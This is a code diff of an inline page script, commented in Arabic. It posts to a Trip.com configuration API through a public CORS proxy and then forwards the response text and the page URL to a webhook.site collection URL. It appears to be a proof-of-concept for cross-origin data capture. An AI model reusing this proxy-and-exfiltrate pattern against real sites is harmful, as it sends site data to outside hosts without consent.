@@ -8,50 +8,47 @@
 
 <script>
 
-// ===== رابط webhook.site لإرسال الرد إليه =====
-const TARGET_URL = "https://webhook.site/2bef5d8a-4a84-4ab7-8e71-ef2f512aa556";
+// ===== استخدم Proxy مختلف =====
+const PROXY_URL = "https://thingproxy.freeboard.io/fetch/";
+const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
 
-// ===== استخدم Proxy لتجاوز CORS =====
-const PROXY_URL = "https://api.allorigins.win/raw?url=";
+// البيانات المرسلة لـ Trip.com
+const tripData = {
+    head: {
+        locale: "ar-XX",
+        currency: "USD",
+        vID: "1783978788105.8e68P1hvGdSY"
+    },
+    platform: "Online",
+    componentType: "online-app-download-universal",
+    version: "6.0.5",
+    pageId: "10320668148",
+    aid: 0,
+    sid: 0,
+    customId: "side",
+    customParam: {}
+};
 
-// ===== الطلب إلى Trip.com عبر Proxy =====
-const TRIP_API = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
-
-fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
+// ===== إرسال الطلب عبر Proxy =====
+fetch(PROXY_URL + TARGET_URL, {
     method: "POST",
     headers: {
         "Content-Type": "application/json"
     },
-    body: JSON.stringify({
-        head:{
-            locale:"ar-XX",
-            currency:"USD",
-            vID:"1783978788105.8e68P1hvGdSY"
-        },
-        platform:"Online",
-        componentType:"online-app-download-universal",
-        version:"6.0.5",
-        pageId:"10320668148",
-        aid:0,
-        sid:0,
-        customId:"side",
-        customParam:{}
-    })
+    body: JSON.stringify(tripData)
 })
 
-// ===== معالجة الرد من Trip.com =====
 .then(async r => {
-    // قراءة الرد
     const status = r.status;
     const responseText = await r.text();
     
     // عرض النتيجة في الصفحة
-    document.getElementById("result").textContent =
+    document.getElementById("result").textContent = 
     "Status: " + status + "\n\n" + responseText;
     
-    // ===== إرسال الرد إلى webhook.site =====
+    // ===== إرسال الرد إلى Webhook.site للتخزين =====
     try {
-        await fetch(TARGET_URL, {
+        await fetch("https://webhook.site/2bef5d8a-4a84-4ab7-8e71-ef2f512aa556", {
             method: "POST",
             mode: 'no-cors',
             headers: {
@@ -65,38 +62,16 @@ fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
                 url: window.location.href
             })
         });
-        
         document.getElementById("result").textContent += 
-        "\n\n✅ تم إرسال البيانات إلى webhook.site";
-        
-    } catch(forwardError) {
-        document.getElementById("result").textContent += 
-        "\n\n❌ فشل إرسال البيانات إلى webhook.site";
+        "\n\n✅ تم إرسال البيانات إلى Webhook.site";
+    } catch(e) {
+        // تجاهل أخطاء الإرسال إلى Webhook
     }
 })
 
-// ===== معالجة الأخطاء =====
 .catch(e => {
-    document.getElementById("result").textContent =
+    document.getElementById("result").textContent = 
     "Blocked:\n" + e;
-    
-    // إرسال الخطأ إلى webhook.site
-    try {
-        fetch(TARGET_URL, {
-            method: "POST",
-            mode: 'no-cors',
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                source: "trip.com",
-                error: e.toString(),
-                timestamp: new Date().toISOString()
-            })
-        });
-    } catch(forwardError) {
-        console.error("❌ فشل إرسال الخطأ:", forwardError);
-    }
 });
 
 </script>
